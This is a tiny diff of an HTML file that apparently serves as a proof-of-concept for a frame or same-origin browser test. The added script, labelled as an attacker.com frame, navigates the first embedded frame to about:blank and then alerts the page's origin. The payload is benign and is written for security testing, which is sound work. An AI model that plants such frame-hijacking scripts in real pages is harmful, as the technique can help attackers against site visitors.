@@ -1,3 +1,9 @@
 <html>
-<script>alert(origin)</script>
+<script>
+  // attacker.com frame
+const victim = window.frames[0];
+victim.location = 'about:blank';
+alert(origin); 
+
+</script>
 </html>
